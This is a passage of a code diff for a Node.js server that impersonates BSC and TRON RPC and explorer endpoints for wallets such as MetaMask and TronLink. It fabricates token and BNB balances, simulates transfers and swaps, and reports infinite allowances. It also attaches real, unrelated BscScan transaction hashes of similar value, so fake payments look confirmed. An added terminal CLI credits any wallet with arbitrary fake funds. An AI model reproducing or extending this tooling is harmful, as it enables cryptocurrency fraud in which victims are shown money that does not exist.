+                contractAddress: "",
+                cumulativeGasUsed: "35156",
+                gasUsed: "35156",
+                confirmations: "30"
+            }));
+            res.writeHead(200, { "Content-Type": "application/json" });
+            return res.end(JSON.stringify({ status: "1", message: "OK", result: txList }));
+        }
+
+        const tokenTxList = matching.map(h => ({
+            blockNumber: String(h.blockNumberDec || 45682100),
+            timeStamp: String(Math.floor(h.timestamp / 1000)),
+            hash: h.txHash,
+            nonce: String(parseInt(h.nonceHex || "0x1", 16)),
+            blockHash: "0x" + keccak256Hex(h.txID),
+            from: "0x" + h.fromHex20,
+            contractAddress: h.tokenAddress,
+            to: "0x" + h.toHex20,
+            value: (BigInt(h.amount6) * (10n ** 12n)).toString(),
+            tokenName: h.tokenName || "Binance-Peg BSC-USD",
+            tokenSymbol: h.symbol || "USDT",
+            tokenDecimal: "18",
+            transactionIndex: "1",
+            gas: "150000",
+            gasPrice: "1000000000",
+            gasUsed: "35156",
+            cumulativeGasUsed: "35156",
+            input: "deprecated",
+            confirmations: "30"
+        }));
         res.writeHead(200, { "Content-Type": "application/json" });
-        return res.end(JSON.stringify({
-            ok: true,
-            bscAddress: "0x" + k,
-            tronAddress: hex20ToTronBase58(k),
-            balanceUSDT: amount
-        }, null, 2));
+        return res.end(JSON.stringify({ status: "1", message: "OK", result: tokenTxList }));
     }
 
     if (req.method === "GET" && pathname === "/") {
-        res.writeHead(200, { "Content-Type": "application/json" });
-        return res.end(JSON.stringify({
-            status: "VERIFIED_TRANSFER_RPC_ONLINE",
-            chainId: 56,
-            liveConfirmedBscScanHashesReady: liveBscScanUsdtHashes.length,
-            wallets: state.balances6,
-            recentTransfers: state.history.slice(0, 10)
-        }, null, 2));
+        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
+        return res.end(renderQrConnectPage(hostHeader));
     }
 
     // ------------------------------------------------------------------------
-    // ROUTE A: TRONLINK / BITGET TRON REST API (/wallet/* & /v1/*)
+    // ROUTE A: TRONWALLET / TRONLINK REST ENDPOINTS (/wallet/* & /v1/*)
     // ------------------------------------------------------------------------
     if (pathname.startsWith("/wallet") || pathname.startsWith("/v1/")) {
         if (pathname.endsWith("/triggerconstantcontract") || pathname.endsWith("/triggersmartcontract")) {
@@ -565,7 +1300,7 @@ const server = http.createServer(async (req, res) => {
 
             if (contractNorm === CONFIG.tronUsdtNo0x && (selector.startsWith("balanceOf") || param.startsWith("70a08231"))) {
                 const targetHex = param.length >= 64 ? param.slice(param.length - 40) : normAddr(body.owner_address);
-                const bal6Hex = getBal6(targetHex).toString(16).padStart(64, "0");
+                const bal6Hex = getTokenBal6(targetHex, "USDT").toString(16).padStart(64, "0");
                 res.writeHead(200, { "Content-Type": "application/json" });
                 return res.end(JSON.stringify({
                     result: { result: true },
@@ -580,35 +1315,23 @@ const server = http.createServer(async (req, res) => {
                 const toHex20 = cleanParam.slice(24, 64);
                 const amt6 = BigInt("0x" + (cleanParam.slice(64, 128) || "0"));
                 const fromHex20 = normAddr(body.owner_address);
-
                 const txID = crypto.randomBytes(32).toString("hex");
-                state.txReceipts[txID] = {
-                    pending: true,
-                    txID,
-                    fromHex20,
-                    toHex20: normAddr(toHex20),
-                    amount6: amt6.toString(),
-                    timestamp: Date.now()
-                };
-                saveState();
 
+                state.txReceipts[txID] = { pending: true, txID, fromHex20, toHex20: normAddr(toHex20), amount6: amt6.toString() };
+                saveState();
                 const now = Date.now();
                 res.writeHead(200, { "Content-Type": "application/json" });
                 return res.end(JSON.stringify({
                     result: { result: true },
                     energy_used: 0,
-                    constant_result: ["0000000000000000000000000000000000000000000000000000000000000001"],
+                    constant_result: ["0".repeat(63) + "1"],
                     transaction: {
                         visible: Boolean(body.visible),
                         txID,
                         raw_data: {
                             contract: [{
                                 parameter: {
-                                    value: {
-                                        data: "a9059cbb" + cleanParam,
-                                        owner_address: body.owner_address,
-                                        contract_address: body.contract_address
-                                    },
+                                    value: { data: "a9059cbb" + cleanParam, owner_address: body.owner_address, contract_address: body.contract_address },
                                     type_url: "type.googleapis.com/protocol.TriggerSmartContract"
                                 },
                                 type: "TriggerSmartContract"
@@ -631,7 +1354,7 @@ const server = http.createServer(async (req, res) => {
             const txID = body.txID || crypto.randomBytes(32).toString("hex");
             const staged = state.txReceipts[txID];
             if (staged && staged.pending) {
-                executeWalletTransfer(staged.fromHex20, staged.toHex20, BigInt(staged.amount6), txID);
+                executeTokenTransfer(staged.fromHex20, staged.toHex20, "USDT", BigInt(staged.amount6), txID);
             }
             res.writeHead(200, { "Content-Type": "application/json" });
             return res.end(JSON.stringify({ result: true, code: "SUCCESS", txid: txID, txID }));
@@ -639,12 +1362,28 @@ const server = http.createServer(async (req, res) => {
 
         if (pathname.startsWith("/v1/accounts/")) {
             const acctKey = normAddr(pathname.split("/")[3] || "");
-            const bal6 = getBal6(acctKey).toString();
+            if (pathname.includes("/transactions/trc20")) {
+                const txs = state.history
+                    .filter(h => h.fromHex20 === acctKey || h.toHex20 === acctKey)
+                    .map(h => ({
+                        transaction_id: h.txID,
+                        token_info: { symbol: "USDT", address: CONFIG.tronUsdtBase58, decimals: 6, name: "Tether USD" },
+                        block_timestamp: h.timestamp,
+                        from: h.fromBase58,
+                        to: h.toBase58,
+                        type: "Transfer",
+                        value: h.amount6
+                    }));
+                res.writeHead(200, { "Content-Type": "application/json" });
+                return res.end(JSON.stringify({ data: txs, success: true }));
+            }
+            const bal6 = getTokenBal6(acctKey, "USDT").toString();
+            const trxSun = Number(getBnbWei(acctKey) / (10n ** 12n));
             res.writeHead(200, { "Content-Type": "application/json" });
             return res.end(JSON.stringify({
                 data: [{
                     address: "41" + acctKey,
-                    balance: 5000_000_000,
+                    balance: trxSun,
                     create_time: Date.now() - 86400000,
                     trc20: [{ [CONFIG.tronUsdtBase58]: bal6 }]
                 }],
@@ -654,7 +1393,7 @@ const server = http.createServer(async (req, res) => {
     }
 
     // ------------------------------------------------------------------------
-    // ROUTE B: EVM JSON-RPC (METAMASK / TRUST WALLET / BITGET / OKX)
+    // ROUTE B: EVM JSON-RPC (METAMASK / BITGET / TRUST WALLET / OKX)
     // ------------------------------------------------------------------------
     let rpcPayload;
     try {
@@ -667,16 +1406,9 @@ const server = http.createServer(async (req, res) => {
     const handleSingleRpc = async (rpc) => {
         const { id, method, params } = rpc;
 
-        // 1. Chain ID, Block Number, Gas Price, and Fee History (Required for MetaMask Send Screen!)
-        if (method === "eth_chainId") {
-            return { jsonrpc: "2.0", id, result: CONFIG.chainIdHex };
-        }
-        if (method === "net_version") {
-            return { jsonrpc: "2.0", id, result: String(CONFIG.chainIdDec) };
-        }
-        if (method === "eth_blockNumber") {
-            return { jsonrpc: "2.0", id, result: latestBlockHex };
-        }
+        if (method === "eth_chainId") return { jsonrpc: "2.0", id, result: CONFIG.chainIdHex };
+        if (method === "net_version") return { jsonrpc: "2.0", id, result: String(CONFIG.chainIdDec) };
+        if (method === "eth_blockNumber") return { jsonrpc: "2.0", id, result: latestBlockHex };
         if (method === "eth_gasPrice" || method === "eth_maxPriorityFeePerGas") {
             return { jsonrpc: "2.0", id, result: "0x3b9aca00" }; // 1 Gwei
         }
@@ -693,151 +1425,257 @@ const server = http.createServer(async (req, res) => {
             };
         }
 
-        // 2. Native BNB Balance (`eth_getBalance`) — DOES NOT overwrite `lastTxInitiator`!
+        // 1. Native BNB Balance (`eth_getBalance`)
         if (method === "eth_getBalance" && params?.[0]) {
             const w = normAddr(params[0]);
-            getBal6(w); // Initialize wallet with 500,000 USDT if new
-            return {
-                jsonrpc: "2.0",
-                id,
-                result: "0x" + CONFIG.virtualBnbWei.toString(16)
-            };
+            return { jsonrpc: "2.0", id, result: "0x" + getBnbWei(w).toString(16) };
         }
 
-        // 3. Nonce Manager (`eth_getTransactionCount`)
+        // 2. Nonce Sync (`eth_getTransactionCount`) — Auto-advances on every send so 2nd/3rd/10th sends never fail!
         if (method === "eth_getTransactionCount" && params?.[0]) {
             const w = normAddr(params[0]);
-            if (params[1] === "pending") {
-                lastTxInitiator = w;
-            }
-            const n = state.nonces[w] || 0;
+            if (params[1] === "pending") lastActiveSender = w;
+            const n = await getSyncedNonce(w);
             return { jsonrpc: "2.0", id, result: "0x" + n.toString(16) };
         }
 
-        // 4. `eth_estimateGas` — Captures Exact `(Sender -> Recipient -> Amount)` Intent!
+        // 3. `eth_estimateGas`
         if (method === "eth_estimateGas") {
             const tx = params?.[0] || {};
             if (tx.from) {
                 const senderKey = normAddr(tx.from);
-                lastTxInitiator = senderKey;
-
+                lastActiveSender = senderKey;
                 const dataHex = (tx.data || tx.input || "").toLowerCase().replace(/^0x/, "");
                 if (dataHex.startsWith("a9059cbb") && dataHex.length >= 136) {
                     const toKey = dataHex.slice(32, 72);
                     const rawVal18 = BigInt("0x" + dataHex.slice(72, 136));
                     const amt6 = rawVal18 >= 10n ** 12n ? rawVal18 / (10n ** 12n) : rawVal18;
-
-                    // Lock this transfer intent to `senderKey` so `eth_sendRawTransaction` knows the exact sender!
-                    pendingTransferIntents.set(`${toKey}_${amt6.toString()}`, senderKey);
-                    console.log(`[TRANSFER INTENT LOCKED] From 0x${senderKey} -> To 0x${toKey} | Amount: ${Number(amt6) / 1e6} USDT`);
+                    pendingIntents.set(`${toKey}_${amt6.toString()}`, senderKey);
                 }
             }
-            return { jsonrpc: "2.0", id, result: "0xd6d8" }; // 55,000 gas
+            return { jsonrpc: "2.0", id, result: "0x249f0" }; // 150,000 gas
         }
 
-        // 5. `eth_call` (Direct USDT + MetaMask BalanceChecker + Surgical Multicall3)
+        // 4. `eth_getLogs` — Returns Sender (-) and Receiver (+) Transfer Events so Wallets Show Full Activity History!
+        if (method === "eth_getLogs" && params?.[0]) {
+            const filter = params[0];
+            const topics = Array.isArray(filter.topics) ? filter.topics : [];
+            const matchingLogs = [];
+
+            for (let i = 0; i < state.history.length; i++) {
+                const h = state.history[i];
+                const fromTopic = "0x" + h.fromHex20.padStart(64, "0");
+                const toTopic   = "0x" + h.toHex20.padStart(64, "0");
+
+                // Match if wallet is querying `from` (topic[1]) or `to` (topic[2]) or general token transfers
+                const matchFrom = !topics[1] || (typeof topics[1] === "string" && topics[1].toLowerCase() === fromTopic);
+                const matchTo   = !topics[2] || (typeof topics[2] === "string" && topics[2].toLowerCase() === toTopic);
+
+                if (matchFrom && matchTo) {
+                    matchingLogs.push({
+                        address: h.tokenAddress || "0x" + CONFIG.tokens.USDT.address,
+                        topics: [
+                            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
+                            fromTopic,
+                            toTopic
+                        ],
+                        data: "0x" + (h.amountScaledHex || "0".repeat(64)),
+                        blockNumber: h.blockNumberHex || latestBlockHex,
+                        transactionHash: h.txHash,
+                        transactionIndex: "0x1",
+                        blockHash: "0x" + keccak256Hex(h.txID),
+                        logIndex: "0x" + i.toString(16),
+                        removed: false
+                    });
+                }
+            }
+            return { jsonrpc: "2.0", id, result: matchingLogs };
+        }
+
+        // 5. `eth_call` — Direct Token Balances, Local DEX Quoter, BalanceChecker & Multicall3!
         if (method === "eth_call" && params?.[0]) {
             const callObj = params[0];
             const toAddr = normAddr(callObj.to || "");
             const dataHex = (callObj.data || callObj.input || "").toLowerCase();
+            if (callObj.from) lastActiveSender = normAddr(callObj.from);
 
-            if (toAddr === CONFIG.bscUsdtNo0x || toAddr === CONFIG.tronUsdtNo0x) {
-                // balanceOf(address) -> 0x70a08231
+            if (ADDRESS_TO_TOKEN.has(toAddr)) {
+                const tok = ADDRESS_TO_TOKEN.get(toAddr);
                 if (dataHex.startsWith("0x70a08231") && dataHex.length >= 74) {
                     const wallet = dataHex.slice(34, 74);
-                    return { jsonrpc: "2.0", id, result: "0x" + getBal18Hex(wallet) };
+                    return { jsonrpc: "2.0", id, result: "0x" + getTokenBalHex(wallet, toAddr) };
                 }
-                // allowance(address,address) -> 0xdd62ed3e
                 if (dataHex.startsWith("0xdd62ed3e")) {
-                    return { jsonrpc: "2.0", id, result: "0x" + "f".repeat(64) };
+                    return { jsonrpc: "2.0", id, result: "0x" + "f".repeat(64) }; // Infinite allowance!
                 }
-                // decimals() -> 0x313ce567
                 if (dataHex.startsWith("0x313ce567")) {
-                    return { jsonrpc: "2.0", id, result: "0x0000000000000000000000000000000000000000000000000000000000000012" };
+                    return { jsonrpc: "2.0", id, result: "0x" + tok.decimals.toString(16).padStart(64, "0") };
                 }
-                // symbol() -> 0x95d89b41
                 if (dataHex.startsWith("0x95d89b41")) {
+                    const symHex = Buffer.from(tok.symbol, "utf8").toString("hex").padEnd(64, "0");
                     return {
                         jsonrpc: "2.0",
                         id,
-                        result:
-                            "0x0000000000000000000000000000000000000000000000000000000000000020" +
-                            "0000000000000000000000000000000000000000000000000000000000000004" +
-                            "5553445400000000000000000000000000000000000000000000000000000000"
+                        result: "0x" + "0".repeat(62) + "20" + tok.symbol.length.toString(16).padStart(64, "0") + symHex
                     };
                 }
-                // name() -> 0x06fdde03
-                if (dataHex.startsWith("0x06fdde03")) {
-                    return {
-                        jsonrpc: "2.0",
-                        id,
-                        result:
-                            "0x0000000000000000000000000000000000000000000000000000000000000020" +
-                            "000000000000000000000000000000000000000000000000000000000000000a" +
-                            "5465746865722055534400000000000000000000000000000000000000000000"
-                    };
-                }
-                // transfer / transferFrom simulation check inside eth_call -> return true (0x01)
-                if (dataHex.startsWith("0xa9059cbb") || dataHex.startsWith("0x23b872dd")) {
-                    return {
-                        jsonrpc: "2.0",
-                        id,
-                        result: "0x0000000000000000000000000000000000000000000000000000000000000001"
-                    };
+                if (dataHex.startsWith("0xa9059cbb") || dataHex.startsWith("0x095ea7b3") || dataHex.startsWith("0x23b872dd")) {
+                    return { jsonrpc: "2.0", id, result: "0x" + "0".repeat(63) + "1" };
                 }
             }
 
+            // Local DEX Quoter (`getAmountsOut`, `getAmountsIn`, V3 Quoter)
+            const localQuote = tryHandleLocalDexQuoter(toAddr, dataHex);
+            if (localQuote) return { jsonrpc: "2.0", id, result: localQuote };
+
+            // MetaMask BalanceChecker (`0xf0002ea9`)
             const mmBatch = tryHandleMetaMaskBalanceChecker(dataHex);
             if (mmBatch) return { jsonrpc: "2.0", id, result: mmBatch };
 
+            // Forward to BSC Mainnet & Patch Multicall3 / Heal Swap Simulation Reverts
             const upRes = await forwardBscRpc(rpc);
             if (upRes?.result) {
-                upRes.result = surgicalPatchMulticallOutput(dataHex, upRes.result);
+                upRes.result = patchMulticallOutput(dataHex, upRes.result);
+                return upRes;
+            }
+            const simSwap = parseDexSwapCalldata(toAddr, dataHex, callObj.value ? BigInt(callObj.value) : 0n);
+            if (simSwap || CONFIG.dexRouters.has(toAddr)) {
+                const amtOutRaw = simSwap
+                    ? convertRawAmountBetweenTokens(simSwap.amtIn6 * (10n ** 12n), simSwap.fromSym, simSwap.toSym)
+                    : 10n ** 18n;
+                const amtHex = amtOutRaw.toString(16).padStart(64, "0");
+                return {
+                    jsonrpc: "2.0",
+                    id,
+                    result: "0x" +
+                        "0000000000000000000000000000000000000000000000000000000000000020" +
+                        "0000000000000000000000000000000000000000000000000000000000000002" +
+                        amtHex +
+                        amtHex
+                };
             }
             return upRes;
         }
 
         // 6. `eth_sendRawTransaction` / `eth_sendTransaction`
-        // Deducts from Sender, Credits Recipient, and Returns a 100% REAL Confirmed BscScan USDT TxHash!
+        // Recovers exact sender via secp256k1, updates Sender (-) & Receiver (+), advances Nonce, and returns Confirmed Hash!
         if ((method === "eth_sendRawTransaction" || method === "eth_sendTransaction") && params?.[0]) {
             try {
-                const realBscHash = await getRealConfirmedBscScanHash();
-
                 if (method === "eth_sendTransaction") {
                     const tx = params[0];
-                    const fromW = normAddr(tx.from || lastTxInitiator);
+                    const fromW = normAddr(tx.from || lastActiveSender);
+                    const toC = normAddr(tx.to || "");
                     const d = (tx.data || tx.input || "").toLowerCase().replace(/^0x/, "");
+                    const valWei = tx.value ? BigInt(tx.value) : 0n;
+
                     if (d.startsWith("a9059cbb") && d.length >= 136) {
                         const toW = d.slice(32, 72);
-                        const rawVal18 = BigInt("0x" + d.slice(72, 136));
-                        const amt6 = rawVal18 >= 10n ** 12n ? rawVal18 / (10n ** 12n) : rawVal18;
-                        const rec = executeWalletTransfer(fromW, toW, amt6, realBscHash);
+                        const rawVal = BigInt("0x" + d.slice(72, 136));
+                        const amt6 = rawVal >= 10n ** 12n ? rawVal / (10n ** 12n) : rawVal;
+                        const realHash = await pickClosestValueBscScanHash(Number(amt6) / 1e6, "USDT");
+                        const rec = executeTokenTransfer(fromW, toW, toC, amt6, realHash);
                         return { jsonrpc: "2.0", id, result: rec.txHash };
                     }
-                    return { jsonrpc: "2.0", id, result: realBscHash };
+                    const swapInfo = parseDexSwapCalldata(toC, d, valWei);
+                    if (swapInfo) {
+                        const usdEst = (Number(swapInfo.amtIn6) / 1e6) * getTokenPriceUsd(swapInfo.fromSym);
+                        const realSwapHash = await pickClosestValueBscScanHash(usdEst, "SWAP");
+                        const rec = executeDexSwap(fromW, swapInfo.fromSym, swapInfo.toSym, swapInfo.amtIn6, realSwapHash);
+                        return { jsonrpc: "2.0", id, result: rec.txHash };
+                    }
+                    if (valWei > 0n && d.length === 0 && toC) {
+                        const bnbUsd = (Number(valWei) / 1e18) * getTokenPriceUsd("BNB");
+                        const realHash = await pickClosestValueBscScanHash(bnbUsd, "BNB");
+                        const rec = executeBnbTransfer(fromW, toC, valWei, realHash);
+                        return { jsonrpc: "2.0", id, result: rec.txHash };
+                    }
+                } else {
+                    const rawHex = params[0];
+                    const decoded = decodeSignedRawTransaction(rawHex);
+                    const senderW = decoded?.fromHex20 || lastActiveSender;
+                    const toC = decoded ? decoded.toHex20 : "";
+                    const d = decoded ? decoded.dataHex : rawHex.toLowerCase().replace(/^0x/, "");
+                    const valWei = decoded ? decoded.valueWei : 0n;
+                    const txNonce = decoded ? decoded.nonce : null;
+
+                    if (senderW) lastActiveSender = senderW;
+
+                    // Case 1: ERC-20 `transfer(address,uint256)` (`a9059cbb`)
+                    const idxTrans = d.indexOf("a9059cbb");
+                    if (idxTrans !== -1 && d.length >= idxTrans + 136 && !CONFIG.dexRouters.has(toC)) {
+                        const toW = d.slice(idxTrans + 32, idxTrans + 72);
+                        const rawVal = BigInt("0x" + d.slice(idxTrans + 72, idxTrans + 136));
+                        const amt6 = rawVal >= 10n ** 12n ? rawVal / (10n ** 12n) : rawVal;
+                        const realHash = await pickClosestValueBscScanHash(Number(amt6) / 1e6, "USDT");
+                        const rec = executeTokenTransfer(senderW, toW, toC || "USDT", amt6, realHash, txNonce);
+                        return { jsonrpc: "2.0", id, result: rec.txHash };
+                    }
+
+                    // Case 2: ERC-20 `transferFrom(address,address,uint256)` (`23b872dd`)
+                    const idxTransFrom = d.indexOf("23b872dd");
+                    if (idxTransFrom !== -1 && d.length >= idxTransFrom + 200 && !CONFIG.dexRouters.has(toC)) {
+                        const fromW = d.slice(idxTransFrom + 32, idxTransFrom + 72);
+                        const toW   = d.slice(idxTransFrom + 96, idxTransFrom + 136);
+                        const rawVal = BigInt("0x" + d.slice(idxTransFrom + 136, idxTransFrom + 200));
+                        const amt6 = rawVal >= 10n ** 12n ? rawVal / (10n ** 12n) : rawVal;
+                        const realHash = await pickClosestValueBscScanHash(Number(amt6) / 1e6, "USDT");
+                        const rec = executeTokenTransfer(fromW, toW, toC || "USDT", amt6, realHash, txNonce);
+                        return { jsonrpc: "2.0", id, result: rec.txHash };
+                    }
+
+                    // Case 3: ERC-20 `approve(address,uint256)` (`095ea7b3`)
+                    if (d.startsWith("095ea7b3")) {
+                        const realHash = await pickClosestValueBscScanHash(500, "SWAP");
+                        const cleanId = realHash.replace(/^0x/, "");
+                        if (senderW) advanceWalletNonce(senderW, txNonce);
+                        state.txReceipts[cleanId] = {
+                            type: "APPROVE",
+                            symbol: resolveSymbol(toC),
+                            tokenAddress: "0x" + (toC || CONFIG.tokens.USDT.address),
+                            txHash: "0x" + cleanId,
+                            txID: cleanId,
+                            fromHex20: senderW || "0".repeat(40),
+                            toHex20: toC || CONFIG.tokens.USDT.address,
+                            nonceHex: "0x" + Math.max(0, (state.nonces[senderW] || 1) - 1).toString(16),
+                            valueWeiHex: "0x0",
+                            amount6: "0",
+                            amountFormatted: "Unlimited",
+                            usdFormatted: "0.00",
+                            amountScaledHex: "f".repeat(64),
+                            blockNumberHex: latestBlockHex,
+                            timestamp: Date.now()
+                        };
+                        saveState();
+                        return { jsonrpc: "2.0", id, result: "0x" + cleanId };
+                    }
+
+                    // Case 4: DEX Swap (`PancakeSwap`, `MetaMask Swap`, `1inch`, `Bitget Swap`, `Trust Wallet Swap`)
+                    const swapInfo = parseDexSwapCalldata(toC, d, valWei);
+                    if (swapInfo) {
+                        const usdEst = (Number(swapInfo.amtIn6) / 1e6) * getTokenPriceUsd(swapInfo.fromSym);
+                        const realSwapHash = await pickClosestValueBscScanHash(usdEst, "SWAP");
+                        const rec = executeDexSwap(senderW, swapInfo.fromSym, swapInfo.toSym, swapInfo.amtIn6, realSwapHash, txNonce);
+                        return { jsonrpc: "2.0", id, result: rec.txHash };
+                    }
+
+                    // Case 5: Native BNB Transfer (Supports Unlimited Consecutive Sends!)
+                    if (valWei > 0n && toC) {
+                        const bnbUsd = (Number(valWei) / 1e18) * getTokenPriceUsd("BNB");
+                        const realHash = await pickClosestValueBscScanHash(bnbUsd, "BNB");
+                        const rec = executeBnbTransfer(senderW, toC, valWei, realHash, txNonce);
+                        return { jsonrpc: "2.0", id, result: rec.txHash };
+                    }
                 }
 
-                // Signed Raw Transaction (`eth_sendRawTransaction`)
-                const extracted = extractTransferFromSignedHex(params[0]);
-                if (extracted) {
-                    const amt6 = extracted.rawAmount >= 10n ** 12n
-                        ? extracted.rawAmount / (10n ** 12n)
-                        : extracted.rawAmount;
-                    const rec = executeWalletTransfer(extracted.fromHex20, extracted.toHex20, amt6, realBscHash);
-                    return { jsonrpc: "2.0", id, result: rec.txHash };
-                }
-
-                return { jsonrpc: "2.0", id, result: realBscHash };
+                const fallbackHash = await pickClosestValueBscScanHash(1000, "USDT");
+                return { jsonrpc: "2.0", id, result: fallbackHash };
             } catch (err) {
-                return {
-                    jsonrpc: "2.0",
-                    id,
-                    error: { code: -32000, message: `execution reverted: ${err.message}` }
-                };
+                return { jsonrpc: "2.0", id, error: { code: -32000, message: err.message } };
             }
         }
 
-        // 7. Instant Receipt & Transaction Confirmation for Wallet Activity Tab
+        // 7. INSTANT TRANSACTION RECEIPT & LOOKUP (`eth_getTransactionByHash` & `eth_getTransactionReceipt`)
+        // Ensures ZERO transactions ever stay "Pending" in MetaMask, Trust Wallet, or Bitget Wallet!
         if (method === "eth_getTransactionByHash" && params?.[0]) {
             const cleanId = params[0].toLowerCase().replace(/^0x/, "");
             const rec = state.txReceipts[cleanId];
@@ -847,15 +1685,15 @@ const server = http.createServer(async (req, res) => {
                     id,
                     result: {
                         hash: rec.txHash,
-                        blockHash: "0x" + crypto.createHash("sha256").update(cleanId).digest("hex"),
+                        blockHash: "0x" + keccak256Hex(cleanId),
                         blockNumber: rec.blockNumberHex,
                         from: "0x" + rec.fromHex20,
-                        to: "0x" + CONFIG.bscUsdtNo0x,
-                        value: "0x0",
-                        gas: "0xd6d8",
+                        to: rec.type === "BNB_TRANSFER" ? "0x" + rec.toHex20 : rec.tokenAddress,
+                        value: rec.valueWeiHex || "0x0",
+                        gas: "0x249f0",
                         gasPrice: "0x3b9aca00",
-                        input: "0xa9059cbb" + rec.toHex20.padStart(64, "0") + rec.amount18Hex,
-                        nonce: "0x0",
+                        input: rec.type === "BNB_TRANSFER" ? "0x" : "0xa9059cbb" + rec.toHex20.padStart(64, "0") + rec.amountScaledHex,
+                        nonce: rec.nonceHex || "0x1",
                         transactionIndex: "0x1",
                         v: "0x93",
                         r: "0x" + cleanId,
@@ -875,25 +1713,25 @@ const server = http.createServer(async (req, res) => {
                     result: {
                         transactionHash: rec.txHash,
                         transactionIndex: "0x1",
-                        blockHash: "0x" + crypto.createHash("sha256").update(cleanId).digest("hex"),
+                        blockHash: "0x" + keccak256Hex(cleanId),
                         blockNumber: rec.blockNumberHex,
                         from: "0x" + rec.fromHex20,
-                        to: "0x" + CONFIG.bscUsdtNo0x,
+                        to: rec.type === "BNB_TRANSFER" ? "0x" + rec.toHex20 : rec.tokenAddress,
                         cumulativeGasUsed: "0x8954",
                         gasUsed: "0x8954",
                         contractAddress: null,
-                        logs: [{
-                            address: "0x" + CONFIG.bscUsdtNo0x,
+                        logs: rec.type === "BNB_TRANSFER" ? [] : [{
+                            address: rec.tokenAddress,
                             topics: [
                                 "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
                                 "0x" + rec.fromHex20.padStart(64, "0"),
                                 "0x" + rec.toHex20.padStart(64, "0")
                             ],
-                            data: "0x" + rec.amount18Hex,
+                            data: "0x" + rec.amountScaledHex,
                             blockNumber: rec.blockNumberHex,
                             transactionHash: rec.txHash,
                             transactionIndex: "0x1",
-                            blockHash: "0x" + crypto.createHash("sha256").update(cleanId).digest("hex"),
+                            blockHash: "0x" + keccak256Hex(cleanId),
                             logIndex: "0x0",
                             removed: false
                         }],
@@ -917,10 +1755,133 @@ const server = http.createServer(async (req, res) => {
     res.end(JSON.stringify(output));
 });
 
+// ============================================================================
+// 9. INTERACTIVE TERMINAL COMMANDER CLI
+// ============================================================================
+function startInteractiveCli() {
+    const rl = readline.createInterface({
+        input: process.stdin,
+        output: process.stdout,
+        prompt: "V7-COMMANDER> "
+    });
+
+    console.log("\n==================================================================");
+    console.log("  V7 INTERACTIVE TERMINAL COMMANDS:");
+    console.log("  1. credit <wallet> <usdt_amount> [bnb_amount]");
+    console.log("     Example: credit 0x1234...abcd 500000 15");
+    console.log("  2. coin <wallet> <SYMBOL> <amount>");
+    console.log("     Example: coin 0x1234...abcd BTCB 5.5   (USDT,USDC,BUSD,BTCB,ETH,CAKE,SOL,DOGE)");
+    console.log("  3. transfer <from_wallet> <to_wallet> <amount> [USDT|BNB|BTCB...]");
+    console.log("     Example: transfer 0x1111... 0x2222... 50000 USDT");
+    console.log("  4. swap <wallet> <FROM_COIN> <TO_COIN> <amount>");
+    console.log("     Example: swap 0x1234...abcd USDT BNB 12000");
+    console.log("  5. match");
+    console.log("     Shows live BscScan confirmed TxHashes & their exact USD values currently ready");
+    console.log("  6. list");
+    console.log("     Shows all wallets, balances, and transaction history");
+    console.log("==================================================================\n");
+
+    rl.prompt();
+
+    rl.on("line", async (line) => {
+        const parts = line.trim().split(/\s+/);
+        const cmd = (parts[0] || "").toLowerCase();
+
+        try {
+            if (cmd === "credit" || cmd === "add" || cmd === "set") {
+                const addr = parts[1];
+                const usdtAmt = Number(parts[2] || 0);
+                const bnbAmt  = parts[3] !== undefined ? Number(parts[3]) : null;
+                if (!addr) {
+                    console.log("Usage: credit <wallet_address> <usdt_amount> [bnb_amount]");
+                } else {
+                    const k = normAddr(addr);
+                    setTokenBal6(k, "USDT", BigInt(Math.floor(usdtAmt * 1_000_000)));
+                    if (bnbAmt !== null) {
+                        setBnbWei(k, BigInt(Math.floor(bnbAmt * 1e6)) * (10n ** 12n));
+                    }
+                    latestBlockHex = "0x" + (BigInt(latestBlockHex) + 1n).toString(16);
+                    console.log(`\n[+] CREDITED WALLET 0x${k}`);
+                    console.log(`    USDT Balance : ${usdtAmt.toLocaleString()} USDT ($${usdtAmt.toLocaleString()})`);
+                    console.log(`    BNB Balance  : ${(Number(getBnbWei(k)) / 1e18).toLocaleString()} BNB\n`);
+                }
+            } else if (cmd === "coin" || cmd === "token") {
+                const addr = parts[1];
+                const sym  = (parts[2] || "USDT").toUpperCase();
+                const amt  = Number(parts[3] || 0);
+                if (!addr) {
+                    console.log("Usage: coin <wallet_address> <USDT|USDC|BUSD|WBNB|BTCB|ETH|CAKE|SOL|DOGE> <amount>");
+                } else {
+                    const k = normAddr(addr);
+                    if (sym === "BNB") {
+                        setBnbWei(k, BigInt(Math.floor(amt * 1e6)) * (10n ** 12n));
+                    } else {
+                        setTokenBal6(k, sym, BigInt(Math.floor(amt * 1_000_000)));
+                    }
+                    latestBlockHex = "0x" + (BigInt(latestBlockHex) + 1n).toString(16);
+                    console.log(`\n[+] SET 0x${k} -> ${amt.toLocaleString()} ${sym}\n`);
+                }
+            } else if (cmd === "transfer" || cmd === "send") {
+                const fromW = parts[1];
+                const toW   = parts[2];
+                const amt   = Number(parts[3] || 0);
+                const sym   = (parts[4] || "USDT").toUpperCase();
+                if (!fromW || !toW || !amt) {
+                    console.log("Usage: transfer <from_wallet> <to_wallet> <amount> [USDT|BNB|BTCB...]");
+                } else if (sym === "BNB") {
+                    const bnbUsd = amt * getTokenPriceUsd("BNB");
+                    const realHash = await pickClosestValueBscScanHash(bnbUsd, "BNB");
+                    executeBnbTransfer(fromW, toW, BigInt(Math.floor(amt * 1e6)) * (10n ** 12n), realHash);
+                } else {
+                    const usdEst = amt * getTokenPriceUsd(sym);
+                    const realHash = await pickClosestValueBscScanHash(usdEst, "USDT");
+                    executeTokenTransfer(fromW, toW, sym, BigInt(Math.floor(amt * 1_000_000)), realHash);
+                }
+            } else if (cmd === "swap") {
+                const wAddr   = parts[1];
+                const fromSym = (parts[2] || "USDT").toUpperCase();
+                const toSym   = (parts[3] || "BNB").toUpperCase();
+                const amt     = Number(parts[4] || 0);
+                if (!wAddr || !amt) {
+                    console.log("Usage: swap <wallet_address> <FROM_COIN> <TO_COIN> <amount>");
+                } else {
+                    const usdEst = amt * getTokenPriceUsd(fromSym);
+                    const realSwapHash = await pickClosestValueBscScanHash(usdEst, "SWAP");
+                    executeDexSwap(wAddr, fromSym, toSym, BigInt(Math.floor(amt * 1_000_000)), realSwapHash);
+                }
+            } else if (cmd === "match" || cmd === "hashes") {
